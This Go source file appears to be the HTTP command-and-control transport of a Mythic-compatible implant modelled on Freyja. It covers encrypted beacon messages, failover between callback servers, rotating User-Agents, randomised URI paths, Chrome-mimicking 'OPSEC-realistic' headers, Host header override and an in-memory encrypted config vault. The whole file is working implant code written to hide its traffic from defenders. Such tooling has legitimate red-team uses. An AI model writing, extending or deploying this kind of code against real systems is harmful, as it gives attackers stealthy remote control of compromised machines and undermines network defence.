package http

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"

	"github.com/andybalholm/brotli"
)


// decryptResponse decrypts a response from Mythic using the same format as Freyja.
// The encKey parameter is the base64-encoded AES key from the C2 profile.
func (h *HTTPProfile) decryptResponse(encryptedData []byte, encKey string) ([]byte, error) {
	if encKey == "" {
		return encryptedData, nil // No encryption
	}

	// Decode the base64 key
	key, err := base64.StdEncoding.DecodeString(encKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	// The response format should be: UUID (36 bytes) + IV (16 bytes) + Ciphertext + HMAC (32 bytes)
	if len(encryptedData) < 36+16+32 {
		return nil, fmt.Errorf("encrypted data too short: %d bytes", len(encryptedData))
	}

	// Skip UUID (first 36 bytes), extract IV (next 16 bytes)
	iv := encryptedData[36:52]

	// Extract HMAC (last 32 bytes)
	hmacBytes := encryptedData[len(encryptedData)-32:]

	// Extract ciphertext (everything between IV and HMAC)
	ciphertext := encryptedData[52 : len(encryptedData)-32]

	// Verify HMAC
	mac := hmac.New(sha256.New, key)
	dataForHmac := encryptedData[:len(encryptedData)-32] // Everything except HMAC
	mac.Write(dataForHmac)
	expectedHmac := mac.Sum(nil)

	if !hmac.Equal(hmacBytes, expectedHmac) {
		// Try HMAC on IV + ciphertext (alternative method for Mythic)
		mac3 := hmac.New(sha256.New, key)
		mac3.Write(encryptedData[36 : len(encryptedData)-32]) // IV + ciphertext
		expectedHmac3 := mac3.Sum(nil)

		if !hmac.Equal(hmacBytes, expectedHmac3) {
			return nil, fmt.Errorf("HMAC verification failed with all methods")
		}
	}

	// Decrypt using AES-CBC
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	if len(ciphertext) == 0 || len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("invalid ciphertext length: %d", len(ciphertext))
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Remove PKCS#7 padding
	padding := int(plaintext[len(plaintext)-1])
	if padding > aes.BlockSize || padding == 0 {
		return nil, fmt.Errorf("invalid padding")
	}

	for i := len(plaintext) - padding; i < len(plaintext); i++ {
		if plaintext[i] != byte(padding) {
			return nil, fmt.Errorf("invalid padding")
		}
	}

	return plaintext[:len(plaintext)-padding], nil
}

// allURLs returns the full URL list in failover order, starting from activeURLIdx.
// Index 0 = BaseURL, 1+ = FallbackURLs.
func (h *HTTPProfile) allURLs(cfg *sensitiveConfig) []string {
	var baseURL string
	var fallbacks []string
	if cfg != nil {
		baseURL = cfg.BaseURL
		fallbacks = cfg.FallbackURLs
	} else {
		baseURL = h.BaseURL
		fallbacks = h.FallbackURLs
	}

	urls := make([]string, 0, 1+len(fallbacks))
	urls = append(urls, baseURL)
	urls = append(urls, fallbacks...)

	// Rotate so the currently active URL is first
	idx := int(h.activeURLIdx.Load())
	if idx > 0 && idx < len(urls) {
		rotated := make([]string, len(urls))
		copy(rotated, urls[idx:])
		copy(rotated[len(urls)-idx:], urls[:idx])
		return rotated
	}
	return urls
}

// resolveURITokens replaces randomization tokens in a URI path at request time.
// Supported tokens:
//   - {rand:N}  — N random hex characters (e.g., {rand:8} → "a3f82b1c")
//   - {int:M-N} — random integer between M and N (e.g., {int:1-100} → "42")
//
// If the path contains no tokens, it is returned unchanged (backward-compatible).
func resolveURITokens(path string) string {
	if !strings.Contains(path, "{") {
		return path
	}

	result := path

	// Replace {rand:N} tokens
	for {
		start := strings.Index(result, "{rand:")
		if start == -1 {
			break
		}
		end := strings.Index(result[start:], "}")
		if end == -1 {
			break
		}
		end += start
		nStr := result[start+6 : end]
		n := 8 // default length
		if parsed, err := fmt.Sscanf(nStr, "%d", &n); err != nil || parsed != 1 || n <= 0 {
			n = 8
		}
		if n > 64 {
			n = 64
		}
		b := make([]byte, (n+1)/2)
		rand.Read(b)
		result = result[:start] + hex.EncodeToString(b)[:n] + result[end+1:]
	}

	// Replace {int:M-N} tokens
	for {
		start := strings.Index(result, "{int:")
		if start == -1 {
			break
		}
		end := strings.Index(result[start:], "}")
		if end == -1 {
			break
		}
		end += start
		rangeStr := result[start+5 : end]
		var lo, hi int
		if _, err := fmt.Sscanf(rangeStr, "%d-%d", &lo, &hi); err != nil || lo >= hi {
			result = result[:start] + "0" + result[end+1:]
			continue
		}
		b := make([]byte, 4)
		rand.Read(b)
		val := lo + int(uint32(b[0])<<24|uint32(b[1])<<16|uint32(b[2])<<8|uint32(b[3]))%(hi-lo+1)
		result = result[:start] + fmt.Sprintf("%d", val) + result[end+1:]
	}

	return result
}

// makeRequest is a helper function to make HTTP requests with automatic failover.
// If the primary URL fails, it tries each fallback URL before returning an error.
// The cfg parameter provides sensitive fields (BaseURL, UserAgent, etc.)
// from the decrypted vault rather than reading from zeroed struct fields.
func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensitiveConfig) (*http.Response, error) {
	// Resolve sensitive fields from config (vault) or struct (unsealed fallback)
	userAgent := h.UserAgent
	hostHeader := h.HostHeader
	var customHeaders map[string]string
	var contentTypes []string
	var uaPool []string
	if cfg != nil {
		userAgent = cfg.UserAgent
		uaPool = cfg.UserAgentPool
		hostHeader = cfg.HostHeader
		customHeaders = cfg.CustomHeaders
		contentTypes = cfg.ContentTypes
	} else {
		uaPool = h.UserAgentPool
		customHeaders = h.CustomHeaders
		contentTypes = h.ContentTypes
	}

	// Rotate User-Agent per request if pool is configured
	if len(uaPool) > 0 {
		idx := h.uaIndex.Add(1) - 1
		userAgent = uaPool[idx%uint32(len(uaPool))]
	}

	// Resolve URI randomization tokens (e.g., /api/v{int:1-3}/{rand:8})
	path = resolveURITokens(path)

	// Get all URLs in failover order (rotated so active URL is first)
	originalIdx := int(h.activeURLIdx.Load())
	urls := h.allURLs(cfg)
	var lastErr error

	for i, baseURL := range urls {
		// Ensure proper URL construction with forward slash
		var reqURL string
		if strings.HasSuffix(baseURL, "/") && strings.HasPrefix(path, "/") {
			reqURL = baseURL + path[1:]
		} else if !strings.HasSuffix(baseURL, "/") && !strings.HasPrefix(path, "/") {
			reqURL = baseURL + "/" + path
		} else {
			reqURL = baseURL + path
		}

		var reqBody io.Reader
		if body != nil {
			reqBody = bytes.NewReader(body)
		}

		req, err := http.NewRequest(method, reqURL, reqBody)
		if err != nil {
			lastErr = fmt.Errorf("failed to create request for %s: %w", baseURL, err)
			continue
		}

		// Set browser-realistic default headers
		req.Header.Set("User-Agent", userAgent)
		if body != nil {
			// Cycle through configured content types, or use default
			ct := "application/x-www-form-urlencoded"
			if len(contentTypes) > 0 {
				idx := h.ctIndex.Add(1) - 1
				ct = contentTypes[idx%uint32(len(contentTypes))]
			}
			req.Header.Set("Content-Type", ct)
		}
		req.Header.Set("Accept", chromeAcceptHeader)
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Accept-Encoding", chromeAcceptEncoding)

		if secChUa := generateSecChUa(userAgent); secChUa != "" {
			req.Header.Set("Sec-Ch-Ua", secChUa)
			req.Header.Set("Sec-Ch-Ua-Mobile", generateSecChUaMobile(userAgent))
			req.Header.Set("Sec-Ch-Ua-Platform", generateSecChUaPlatform(userAgent))
		}

		req.Header.Set("Upgrade-Insecure-Requests", "1")

		for k, v := range customHeaders {
			req.Header.Set(k, v)
		}

		if hostHeader != "" {
			req.Host = hostHeader
		}

		resp, err := h.client.Do(req)
		if err != nil {
			if resp != nil && resp.Body != nil {
				resp.Body.Close()
			}
			lastErr = fmt.Errorf("HTTP request to %s failed: %w", baseURL, err)
			if len(urls) > 1 {
				log.Printf("failover: endpoint unavailable")
			}
			continue
		}

		// Success — remember which URL worked for next time
		newIdx := (originalIdx + i) % len(urls)
		if newIdx != originalIdx {
			h.activeURLIdx.Store(int32(newIdx))
			log.Printf("failover: switched endpoint")
		}
		return resp, nil
	}

	return nil, lastErr
}

// readResponseBody reads and decompresses the response body if needed.
// When Accept-Encoding is set explicitly (for OPSEC-realistic headers), Go's
// http.Transport does NOT auto-decompress responses. This helper transparently
// handles gzip and Brotli-compressed responses from CDNs, proxies, or load balancers.
func readResponseBody(resp *http.Response) ([]byte, error) {
	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		gr, err := gzip.NewReader(resp.Body)
		if err != nil {
			return nil, fmt.Errorf("gzip decompression failed: %w", err)
		}
		defer gr.Close()
		return io.ReadAll(gr)
	case "br":
		return io.ReadAll(brotli.NewReader(resp.Body))
	default:
		return io.ReadAll(resp.Body)
	}
}

// getString safely gets a string value from a map
func getString(m map[string]interface{}, key string) string {
	if val, exists := m[key]; exists {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return ""
}

// encryptMessage encrypts a message exactly like Freyja's AesEncrypt.
// The encKey parameter is the base64-encoded AES key from the C2 profile.
// Returns an error if encryption fails — never falls back to plaintext to avoid leaking unencrypted data.
func (h *HTTPProfile) encryptMessage(msg []byte, encKey string) ([]byte, error) {
	if encKey == "" {
		return msg, nil
	}

	key, err := base64.StdEncoding.DecodeString(encKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, fmt.Errorf("failed to generate IV: %w", err)
	}

	mode := cipher.NewCBCEncrypter(block, iv)

	padded, err := pkcs7Pad(msg, aes.BlockSize)
	if err != nil {
		return nil, fmt.Errorf("failed to pad message: %w", err)
	}

	encrypted := make([]byte, len(padded))
	mode.CryptBlocks(encrypted, padded)

	ivCiphertext := append(iv, encrypted...)

	hmacHash := hmac.New(sha256.New, key)
	hmacHash.Write(ivCiphertext)
	hmacBytes := hmacHash.Sum(nil)

	return append(ivCiphertext, hmacBytes...), nil
}

// pkcs7Pad adds PKCS#7 padding (matching Freyja's implementation)
func pkcs7Pad(data []byte, blockSize int) ([]byte, error) {
	if blockSize <= 0 {
		return nil, fmt.Errorf("invalid blocksize")
	}
	if len(data) == 0 {
		return nil, fmt.Errorf("invalid PKCS7 data (empty or not padded)")
	}
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...), nil
}

// vaultEncrypt encrypts plaintext with AES-256-GCM (nonce prepended).
func vaultEncrypt(key, plaintext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil
	}
	return gcm.Seal(nonce, nonce, plaintext, nil)
}

// vaultDecrypt decrypts AES-256-GCM ciphertext with prepended nonce.
func vaultDecrypt(key, ciphertext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize+1 {
		return nil
	}
	nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil
	}
	return plaintext
}

// vaultZeroBytes overwrites a byte slice with zeros.
func vaultZeroBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}
